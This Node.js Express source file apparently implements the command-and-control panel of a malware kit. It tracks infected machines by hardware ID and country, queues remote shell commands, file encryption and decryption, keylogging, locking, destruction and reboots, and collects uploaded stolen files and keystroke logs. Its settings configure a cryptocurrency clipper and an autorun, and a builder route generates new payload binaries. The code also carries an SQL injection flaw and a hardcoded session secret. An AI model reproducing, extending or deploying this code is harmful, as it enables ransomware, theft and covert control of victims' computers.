const express = require("express");
const cookieParser = require("cookie-parser");
const sessions = require("express-session");
const AppDAO = require("./dao");
const app = express();
const PORT = 3001;
const oneDay = 1000 * 60 * 60 * 24;
var session;
const db = new AppDAO("./db/data.db");
const fs = require("fs");
const fileUpload = require('express-fileupload');
const { lookup } = require('geoip-lite');
var execFile = require('child_process').execFile;

const axios = require("axios");


axios.get("https://api.ipify.org?format=json").then((res) => {
  fs.writeFile("remote", res.data.ip, function (err) {
    if (err) {
      return console.log(err);
    }
  });
});

db.exec(db.cDB);

db.addSetting("false", "BTCaddy", "ETHaddy", "false", 10, "false")
//db.addSetting("ETH", "(?:^0x[a-fA-F0-9]{40}$)", "addyHere");

app.set("view engine", "ejs");
app.use(
  sessions({
    secret: "Th3mYRkqj8hFonjh",
    saveUninitialized: true,
    cookie: { maxAge: oneDay },
    resave: false,
  })
);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(fileUpload());

//serving public file
app.use(express.static("public"));
app.use(cookieParser());

app.get('/init', async (req, res) => {
  try {

    var hwid = req.headers["CN-X"]
    var ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    try {
    //db.addAction(hwid);
    db.addInfected(hwid,(lookup(ip)).country);
    } catch { }
    
    db.all(`SELECT * FROM settings`).then((data) => {
      var s = data;
      res.send(s);
    });
  } catch (err) {
      res.status(500).send(err);
  }
});

app.get('/act', async (req, res) => {
  try {
    var hwid = req.headers["CN-X"]
    //var hwid = 'HWID1'
    db.all(`SELECT * FROM actions WHERE hwid = '` + hwid+`'`).then((data) => {
      var s = data;
      res.send(s);
    });
  } catch (err) {
      res.status(500).send(err);
  }
});

app.get('/d', async (req, res) => {
  try {
    //var hwid = req.headers["CN-X"]
    var id = req.query.id
    //var hwid = 'HWID1'
    db.deleteAct(id);
    
  } catch (err) {
      res.status(500).send(err);
  }
});

app.post('/ipl', async (req, res) => {
  try {
      if(!req.files) {
          res.send({
              status: false,
              message: 'No file uploaded'
          });
      } else {
          //var hwid = req.headers["CN-X"]
          let fl = req.files['uplTheFile'];

          if ((fl.name).includes('kylx'))
          {
            fl.mv('public/keylogs/' + fl.name);
          }
          else {
            fl.mv('public/files/' + fl.name);
          }
          
          
          //send response
          res.send({
            status: true,
            message: 'File is uploaded',
            data: {
                name: fl.name,
                mimetype: fl.mimetype,
                size: fl.size
            }
          });
      }
  } catch (err) {
      console.log(err)
      res.status(500).send(err);
  }
});


app.get("/gl", (req, res) => {
  session = req.session;
  var x = "";
  fs.readdir('public/files', (err, files) => {
    var x = "";
    let i = 0;
    files.forEach(file => {
      
      if (file.includes(req.query.hwid))
      {
        i = 1
        x += "<a href='files/" + file + "'>" + file + "</a><br/>";
      }
    });

    if (i == 0)
    {
      res.send("No Results found!");
    }
    else 
    {
      res.send(x );
    }
  });
  
});


app.get("/gkl", (req, res) => {
  session = req.session;
  fs.readdir('public/keylogs', (err, files) => {
    var x = "";
    let i = 0;
    files.forEach(file => {
      if (file.includes(req.query.hwid))
      {
        i = 1
        x += "<a href='keylogs/" + file + "'>" + file + "</a><br/>";
      }
    });
    if (i == 0)
    {
      res.send("No Results found!");
    }
    else 
    {

      res.send(x );
    }
  });
  
});

app.get("/", (req, res) => {
  res.redirect('/dashboard');
});

app.get("/c", (req, res) => {
  session = req.session;

  if (req.query.hwid)
  {
    req.session.hwid = req.query.hwid;
  }

  
  res.render("pages/dashboard/control");
  
});

app.post("/c", (req, res) => {
  session = req.session;
  if (req.session.hwid)
  {
    var hwid = req.session.hwid;
    var b = req.body;
    var action = 'none';
    var data = 'none';

    if (b.oUrl) {
      action = 'oUrl';
      data = b.url;
    } else if (b.shell) {
      action = 'shl';
      data = b.cmd;
    } else if (b.Encrypt) {
      action = 'enc';
      data = b.key;
    } else if (b.Decrypt) {
      action = 'dec';
      data = b.key;
    } else if (b.keylogger) {
      action = 'keyl';
    } else if (b.lock) {
      action = 'delock';
    } else if (b.Destroy) {
      action = 'destry';
    } else if (b.Reboot) {
      action = 'stdw';
    } else {
      //reboot
      action = 'rbt';
    }
    db.addAction(hwid, action, data);

  }
  res.send("Sent Action to " + hwid);
  
});

app.get("/clients", (req, res) => {
  session = req.session;

  db.all(`SELECT * FROM infected`).then((data) => {
    res.render("pages/dashboard/clients", {
      clients: JSON.parse(data),
    });
  });

 // res.render("pages/dashboard/clients");
  
});


app.get("/dashboard", (req, res) => {
  session = req.session;

  let infected = 0
  let logs = 0
  let strokes = 0;
  let builds = 0;

  db.all(`SELECT COUNT(*) count FROM infected`).then((data) => {
    var s = JSON.parse(data);
    infecteds = s[0].count;
    logs = fs.readdirSync('public/files/').length
    strokes = fs.readdirSync('public/keylogs/').length

    fs.readFile('builds', function (err, data) {
      data = data.toString("utf-8");
      builds = parseInt(data);

      res.render("pages/dashboard/index", {
        user: session.username,
        infecteds: infecteds,
        logs: logs,
        strokes: strokes,
        builds: builds,
      });

    });
  });
  
  
});

app.get("/settings", (req, res) => {
  session = req.session;
  //res.render("pages/dashboard/settings");


  db.all(`SELECT * FROM settings`).then((data) => {
    //res.send(data);

    var o = JSON.parse(data);
    var autoR = '';
    var clipper = '';
    var keylogger = '';

    if (o[0].clipper == 'true')
    {
      clipper = 'checked';
    }

    if (o[0].keylogger == 'true')
    {
      keylogger = 'checked';
    }

    if (o[0].autoRun == 'true')
    {
      autoR = 'checked';
    }

    res.render("pages/dashboard/settings", {
      cp: clipper,
      ky: keylogger,
      aR: autoR,
      btc: o[0].btcAddy,
      eth: o[0].ethAddy,
      s: o[0].s,
      n: o[0].nulled,
    });
  });
  
});





app.get("/builder", (req, res) => {

  fs.readFile('builds', function (err, data) {
    data = data.toString("utf-8");
    const i = parseInt(data);
    var l = i;
    l ++;
    var index_feb = String(l);   
    fs.writeFile(path = 'builds', index_feb, function (err, data) {} );
  });

  db.all(`SELECT * FROM settings`).then((data) => {
    var s = JSON.parse(data);
    var authkey = s[0].nulled;

    execFile('Builder', [authkey], function(err, data) {
      if(err) {
          console.log(err)
      } 
      else 
      res.redirect("/build/module.bin");                       
    }); 
  });
});

app.post("/settings", (req, res) => {
  session = req.session;
  var data = req.body;
  try {
    //drop settings, recreate it, insert all
    //db.deleteSetting();
    var cp = "false";
    var kl = "false";
    var autoR = "false";
    var s = 5;
    if (data.clipper != null)
    {
      cp = "true";
    }

    if (data.keylogger != null)
    {
      kl = "true";
    }

    if (data.autoR != null)
    {
      autoR = "true";
    }
    
    if (data.sleep != '' && !isNaN(data.sleep))
    {
      s = parseInt(data.sleep)
    }

    db.updSetting(cp, data.btcAddy, data.ethAddy, autoR, s, kl, data.nulled)

  } catch {}
  res.redirect("/settings");
});

app.listen(PORT, "0.0.0.0", () =>
  console.log(`Server Running at port ${PORT}`)
);
